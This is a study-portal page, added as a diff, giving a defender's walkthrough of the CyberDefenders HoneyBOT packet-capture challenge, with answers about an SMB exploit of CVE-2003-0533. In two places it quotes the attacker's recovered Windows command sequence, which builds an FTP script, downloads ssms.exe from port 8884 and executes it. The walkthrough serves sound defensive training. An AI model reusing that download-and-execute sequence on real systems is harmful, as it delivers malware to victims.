@@ -1,0 +1,316 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>HoneyBOT (CyberDefenders) | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="network-analysis-labs.html">Network Analysis Labs</a><span>/</span><span>HoneyBOT (CyberDefenders)</span></div>
+      <h1>HoneyBOT (CyberDefenders)</h1>
+      <p>A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)</p>
+      <div class="tag-row"><span class="tag level">L2</span><span class="tag">Windows</span><span class="tag">Network</span><span class="tag">Memory</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Network Analysis Labs</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="network-analysis-labs.html"><span>Network Analysis Labs</span><em>L2</em></a>
+      <b>28</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="packet-puzzle-htb.html"><span>Packet Puzzle (HTB)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="pikaptcha-htb.html"><span>Pikaptcha (HTB)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="web-shell-btlo.html"><span>Web Shell (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="noxious-htb.html"><span>Noxious (HTB)</span><em>L2</em></a>
+      <b>2</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" >
+    <summary>
+      <a class="" href="llmnr-poisoning-overview-4469348d.html"><span>LLMNR Poisoning Overview</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" >
+    <summary>
+      <a class="" href="example-of-llmnr-poisoning-9cadbd94.html"><span>Example of LLMNR poisoning</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="reaper-htb.html"><span>Reaper (HTB)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="port-scan-activity-letsdefend.html"><span>Port Scan Activity (LetsDefend)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="openwire-cyberdefenders.html"><span>OpenWire (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="intro-to-network-analysis-challenge-btlo.html"><span>intro to Network Analysis Challenge (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="network-analysis-ransomware-btlo.html"><span>Network Analysis - Ransomware (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="network-analysis-malware-compromise-btlo.html"><span>Network Analysis – Malware Compromise (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="malware-traffic-analysis-1-cyberdefenders.html"><span>Malware Traffic Analysis 1 (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="malware-traffic-analysis-2-cyberdefenders.html"><span>Malware Traffic Analysis 2 (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="malware-traffic-analysis-3-cyberdefenders.html"><span>Malware Traffic Analysis 3 (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="web-investigation-cyberdefenders.html"><span>Web Investigation (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="tomcat-takeover-cyberdefenders.html"><span>Tomcat Takeover (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="packetmaze-cyberdefenders.html"><span>PacketMaze (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="psexec-hunt-cyberdefenders.html"><span>PsExec Hunt (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="danabot-cyberdefenders.html"><span>DanaBot (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="webstrike-lab-cyberdefenders.html"><span>WebStrike Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="piggy-btlo.html"><span>Piggy (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="packetdetective-lab-cyberdefenders.html"><span>PacketDetective Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="poisonedcredentials-cyberdefenders.html"><span>PoisonedCredentials (Cyberdefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="active" href="honeybot-cyberdefenders.html"><span>HoneyBOT (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="warzone-1-thm.html"><span>Warzone 1 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="warzone-2-thm.html"><span>Warzone 2 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="masterminds-thm.html"><span>Masterminds (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="carnage-thm.html"><span>Carnage (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="boogeyman-1-thm.html"><span>Boogeyman 1 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)</p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>HoneyBOT (CyberDefenders)</li><li>Scenario</li><li>1- What is the attacker's IP address?</li><li>98.114.205.102</li><li>2- What is the target's IP address?</li><li>192.150.11.111</li><li>3- Provide the country code for the attacker's IP address (a.k.a geo-location).</li><li>US</li><li>4- How many TCP sessions are present in the captured traffic?</li><li>5</li><li>5- How long did it take to perform the attack (in seconds)?</li><li>16</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code>echo open 0.0.0.0 8884 &gt; o
+echo user 1 1 &gt;&gt; o
+echo get ssms.exe &gt;&gt; o
+echo quit &gt;&gt; o
+ftp -n -s:o
+del /F /Q o &amp; ssms.exe</code></pre></div></article>
+    <article><h2>Tools Used</h2><ul><li>Wireshark</li></ul></article>
+    <article><h2>Notes/Tips</h2><p class="muted">No extracted items for this section.</p></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="honeybot-cyberdefenders">HoneyBOT (CyberDefenders)</h2>
+<h3 id="scenario"><strong>Scenario</strong></h3>
+<p><strong>A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)</strong></p>
+<p><strong>As a soc analyst, analyze the artifacts and answer the questions.</strong></p>
+<p><a class="note-link" href="https://cyberdefenders.org/blueteam-ctf-challenges/honeybot/">https://cyberdefenders.org/blueteam-ctf-challenges/honeybot/</a></p>
+<hr>
+<h4 id="1-what-is-the-attackers-ip-address">1- What is the attacker's IP address?</h4>
+<h4 id="98.114.205.102">98.114.205.102</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033702-c08d8458.png" data-alt="Screenshot 2025-09-02 033702.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033702-c08d8458.png" alt="Screenshot 2025-09-02 033702.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033731-7da70dc7.png" data-alt="Screenshot 2025-09-02 033731.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033731-7da70dc7.png" alt="Screenshot 2025-09-02 033731.png" loading="lazy"></button></p>
+<p>We were initially given two IPs (one internal, one external) and i tried the external IP and it worked yaaay , but that’s not a good way to answer. To validate the finding properly, I inspected the first packets in the capture.</p>
+<p>The connection was initiated by <strong>98.114.205.102</strong> sending a <strong>TCP SYN</strong> to <strong>192.150.11.111:445</strong> (SMB). The victim replied with a <strong>SYN-ACK</strong>, and the attacker completed the three-way handshake with an <strong>ACK</strong> this confirms that <strong>98.114.205.102</strong> was the originator of the session. Subsequent packets show SMB traffic originating from that IP and accessing the <code>IPC$</code> share, which is commonly targeted for information gathering and remote interaction. Seeing an SMB handshake followed by IPC$ activity strongly suggests automated scanning/exploitation attempts (</p>
+<p>Putting it together: the packet-level evidence (SYN → SYN-ACK → ACK from 98.114.205.102 to 192.150.11.111:445, plus SMB/IPC$ activity) confirms <strong>98.114.205.102</strong> as the attacker IP</p>
+<h4 id="2-what-is-the-targets-ip-address">2- What is the target's IP address?</h4>
+<h4 id="192.150.11.111">192.150.11.111</h4>
+<h4 id="3-provide-the-country-code-for-the-attackers-ip-address-a.k.a-geo-location.">3- Provide the country code for the attacker's IP address (a.k.a geo-location).</h4>
+<h4 id="us">US</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033628-2b59fe95.png" data-alt="Screenshot 2025-09-02 033628.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033628-2b59fe95.png" alt="Screenshot 2025-09-02 033628.png" loading="lazy"></button></p>
+<h4 id="4-how-many-tcp-sessions-are-present-in-the-captured-traffic">4- How many TCP sessions are present in the captured traffic?</h4>
+<h4 id="5">5</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033853-89304919.png" data-alt="Screenshot 2025-09-02 033853.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033853-89304919.png" alt="Screenshot 2025-09-02 033853.png" loading="lazy"></button></p>
+<p>By navigating to <code>Statistics &gt; Conversations</code> and selecting the <code>TCP tab</code></p>
+<h4 id="5-how-long-did-it-take-to-perform-the-attack-in-seconds">5- How long did it take to perform the attack (in seconds)?</h4>
+<h4 id="16">16</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033939-a98bb6fa.png" data-alt="Screenshot 2025-09-02 033939.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_033939-a98bb6fa.png" alt="Screenshot 2025-09-02 033939.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034013-d2962041.png" data-alt="Screenshot 2025-09-02 034013.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034013-d2962041.png" alt="Screenshot 2025-09-02 034013.png" loading="lazy"></button></p>
+<p>in Capture File Properties we can find the answer</p>
+<p>or the 💀 way is to subtract the difference between the first and the last packet</p>
+<h4 id="6-provide-the-cve-number-of-the-exploited-vulnerability.">6- Provide the CVE number of the exploited vulnerability.</h4>
+<h4 id="cve-2003-0533">CVE-2003-0533</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034100-08a69be9.png" data-alt="Screenshot 2025-09-02 034100.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034100-08a69be9.png" alt="Screenshot 2025-09-02 034100.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034218-1ee71151.png" data-alt="Screenshot 2025-09-02 034218.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034218-1ee71151.png" alt="Screenshot 2025-09-02 034218.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034342-97571640.png" data-alt="Screenshot 2025-09-02 034342.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034342-97571640.png" alt="Screenshot 2025-09-02 034342.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_035404-e2f0946b.png" data-alt="Screenshot 2025-09-02 035404.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_035404-e2f0946b.png" alt="Screenshot 2025-09-02 035404.png" loading="lazy"></button></p>
+<p>I observed a <strong><code>DsRolerUpgradeDownlevelServer</code></strong> request in the capture (sent from <code>98.114.205.102</code> to <code>192.150.11.111</code>), found by inspecting the Protocol Hierarchy and applying a <code>dcerpc</code> filter in Wireshark. The flow shows an RPC <strong>Bind</strong> followed by the <code>DsRolerUpgradeDownlevelServer</code> call, and the victim returned <code>WERR_OK (0x00000000)</code>, indicating the operation completed successfully. A quick search for <strong>“DsRolerUpgradeDownlevelServer CVE”</strong> points to <strong><code>CVE-2003-0533</code></strong>, which describes a remote exploit impacting LSASS that can lead to remote code execution via malformed RPC/SMB requests. The observed DCE/RPC-over-SMB activity and successful remote call align with that vulnerability.</p>
+<h4 id="7-which-protocol-was-used-to-carry-over-the-exploit">7- Which protocol was used to carry over the exploit?</h4>
+<h4 id="smb">SMB</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034416-faaa1cb6.png" data-alt="Screenshot 2025-09-02 034416.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034416-faaa1cb6.png" alt="Screenshot 2025-09-02 034416.png" loading="lazy"></button></p>
+<h4 id="8-which-protocol-did-the-attacker-use-to-download-additional-malicious-files-to-the-target">8- Which protocol did the attacker use to download additional malicious files to the target system?</h4>
+<h4 id="ftp">ftp</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034529-42a7badc.png" data-alt="Screenshot 2025-09-02 034529.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034529-42a7badc.png" alt="Screenshot 2025-09-02 034529.png" loading="lazy"></button></p>
+<p><strong>Answer — FTP</strong></p>
+<p>Following the TCP stream showed Windows command-line steps that build and run an FTP script named <code>o</code>:</p>
+<div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-text">echo open 0.0.0.0 8884 &gt; o
+echo user 1 1 &gt;&gt; o
+echo get ssms.exe &gt;&gt; o
+echo quit &gt;&gt; o
+ftp -n -s:o
+del /F /Q o &amp; ssms.exe</code></pre></div>
+<p>This sequence creates an FTP script that connects to <code>0.0.0.0</code> on port <strong><code>8884</code></strong> (a non-standard FTP port), logs in with credentials <code>1 1</code>, downloads <code>ssms.exe</code>, removes the script, and then executes the file. The presence of these commands in the TCP stream confirms the attacker used <strong>FTP</strong> (over a custom port) to retrieve and run an additional malicious payload.</p>
+<h4 id="9-what-is-the-name-of-the-downloaded-malware">9- What is the name of the downloaded malware?</h4>
+<h4 id="ssms.exe">ssms.exe</h4>
+<h4 id="10-the-attackers-server-was-listening-on-a-specific-port.-provide-the-port-number.">10- The attacker's server was listening on a specific port. Provide the port number.</h4>
+<h4 id="8884">8884</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034628-a496b459.png" data-alt="Screenshot 2025-09-02 034628.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034628-a496b459.png" alt="Screenshot 2025-09-02 034628.png" loading="lazy"></button></p>
+<h4 id="11-when-was-the-involved-malware-first-submitted-to-virustotal-for-analysis-format-yyyy-mm">11- When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD</h4>
+<h4 id="2007-06-27">2007-06-27</h4>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034838-d3ea2179.png" data-alt="Screenshot 2025-09-02 034838.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034838-d3ea2179.png" alt="Screenshot 2025-09-02 034838.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034917-e770a383.png" data-alt="Screenshot 2025-09-02 034917.png"><img src="../assets/images/network-analysis-labshoneybot-cyberdefenders-screenshot_2025-09-02_034917-e770a383.png" alt="Screenshot 2025-09-02 034917.png" loading="lazy"></button></p>
+<p>TCP Stream <strong>4</strong> contained the file; I saved the stream in <strong>Raw</strong> mode and calculated its MD5 (<code>14a09a48ad23fe0ea5a180bee8cb750a</code>). Looking up that hash on VirusTotal shows the malware was first submitted on <strong>2007-06-27</strong>.</p>
+<h4 id="12-what-is-the-key-used-to-encode-the-shellcode">12- What is the key used to encode the shellcode?</h4>
+<h4 id="0x99">0x99</h4>
+<h4 id="13-what-is-the-port-number-the-shellcode-binds-to">13- What is the port number the shellcode binds to?</h4>
+<h4 id="1957">1957</h4>
+<h4 id="14-the-shellcode-used-a-specific-technique-to-determine-its-location-in-memory.-what-is-th">14- The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?</h4>
+<h4 id="kernel32.dll">kernel32.dll</h4></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#honeybot-cyberdefenders">HoneyBOT (CyberDefenders)</a><a href="#scenario">Scenario</a><a href="#1-what-is-the-attackers-ip-address">1- What is the attacker's IP address?</a><a href="#98.114.205.102">98.114.205.102</a><a href="#2-what-is-the-targets-ip-address">2- What is the target's IP address?</a><a href="#192.150.11.111">192.150.11.111</a><a href="#3-provide-the-country-code-for-the-attackers-ip-address-a.k.a-geo-location.">3- Provide the country code for the attacker's IP address (a.k.a geo-location).</a><a href="#us">US</a><a href="#4-how-many-tcp-sessions-are-present-in-the-captured-traffic">4- How many TCP sessions are present in the captured traffic?</a><a href="#5">5</a><a href="#5-how-long-did-it-take-to-perform-the-attack-in-seconds">5- How long did it take to perform the attack (in seconds)?</a><a href="#16">16</a><a href="#6-provide-the-cve-number-of-the-exploited-vulnerability.">6- Provide the CVE number of the exploited vulnerability.</a><a href="#cve-2003-0533">CVE-2003-0533</a><a href="#7-which-protocol-was-used-to-carry-over-the-exploit">7- Which protocol was used to carry over the exploit?</a><a href="#smb">SMB</a><a href="#8-which-protocol-did-the-attacker-use-to-download-additional-malicious-files-to-the-target">8- Which protocol did the attacker use to download additional malicious files to the target system?</a><a href="#ftp">ftp</a><a href="#9-what-is-the-name-of-the-downloaded-malware">9- What is the name of the downloaded malware?</a><a href="#ssms.exe">ssms.exe</a><a href="#10-the-attackers-server-was-listening-on-a-specific-port.-provide-the-port-number.">10- The attacker's server was listening on a specific port. Provide the port number.</a><a href="#8884">8884</a><a href="#11-when-was-the-involved-malware-first-submitted-to-virustotal-for-analysis-format-yyyy-mm">11- When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD</a><a href="#2007-06-27">2007-06-27</a><a href="#12-what-is-the-key-used-to-encode-the-shellcode">12- What is the key used to encode the shellcode?</a><a href="#0x99">0x99</a><a href="#13-what-is-the-port-number-the-shellcode-binds-to">13- What is the port number the shellcode binds to?</a><a href="#1957">1957</a><a href="#14-the-shellcode-used-a-specific-technique-to-determine-its-location-in-memory.-what-is-th">14- The 